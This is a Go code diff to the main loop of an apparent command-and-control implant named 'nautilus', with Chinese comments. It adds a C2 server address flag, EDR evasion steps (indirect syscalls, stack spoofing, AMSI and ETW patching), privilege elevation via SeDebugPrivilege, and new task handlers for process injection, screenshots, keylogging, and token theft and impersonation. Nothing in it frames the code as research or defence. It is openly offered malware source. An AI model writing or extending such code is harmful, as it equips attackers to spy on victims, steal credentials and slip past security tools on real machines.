@@ -1,7 +1,9 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"math/rand"
 	"os"
@@ -13,6 +15,13 @@ import (
 	"nautilus/core"
 	"nautilus/evasion"
 )
+
+func init() {
+	flag.StringVar(&c2Addr, "addr", "http://localhost:8443", "C2 server address")
+	flag.StringVar(&intervalStr, "interval", "", "heartbeat interval in seconds")
+	flag.StringVar(&jitterStr, "jitter", "", "jitter percentage")
+	flag.StringVar(&skipSandbox, "skip-sandbox", "", "skip sandbox check")
+}
 
 var (
 	c2Addr      string
@@ -41,10 +50,16 @@ func normalInit() {
 }
 
 func main() {
+	flag.Parse()
 	normalInit()
 
 	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
 	evasion.InitSSNMap()
+	evasion.InitIndirectSyscall()
+	evasion.InitStackSpoof()
+
+	// ===== 提权: SeDebugPrivilege =====
+	core.TryElevate()
 
 	// ===== EDR Evasion: AMSI + ETW Patch =====
 	evasion.BypassAMSI()
@@ -102,7 +117,8 @@ func main() {
 	for {
 		// 随机额外延迟，打破固定心跳模式
 		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
-		evasion.EkkoSleep(tp.GetInterval() + extraDelay)
+		// TODO: 修复与Go运行时.data段冲突的问题
+		time.Sleep(tp.GetInterval() + extraDelay)
 
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
@@ -250,6 +266,48 @@ func procReq(pkt *encode.Packet) []byte {
 
 	case encode.TaskPayload:
 		resp.Output = handlePayload(req.Params)
+
+	case encode.TaskInject:
+		output, err := core.HandleInject(req.Params)
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
+
+	case encode.TaskScreenshot:
+		data, err := core.CaptureScreenshot()
+		resp.Success = err == nil
+		if err != nil {
+			resp.Error = err.Error()
+		} else {
+			resp.Output = base64.StdEncoding.EncodeToString(data)
+		}
+
+	case encode.TaskKeylogOn:
+		err := core.StartKeylogger()
+		resp.Success = err == nil
+		if err != nil {
+			resp.Error = err.Error()
+		} else {
+			resp.Output = "keylogger started"
+		}
+
+	case encode.TaskKeylogOff:
+		output, err := core.StopKeylogger()
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
+
+	case encode.TaskTokenEnum, encode.TaskTokenSteal, encode.TaskTokenRev2, encode.TaskTokenMake:
+		output, err := core.HandleToken(req.Params)
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
 
 	case encode.TaskSysInfo:
 		info := core.GetSysInfo()
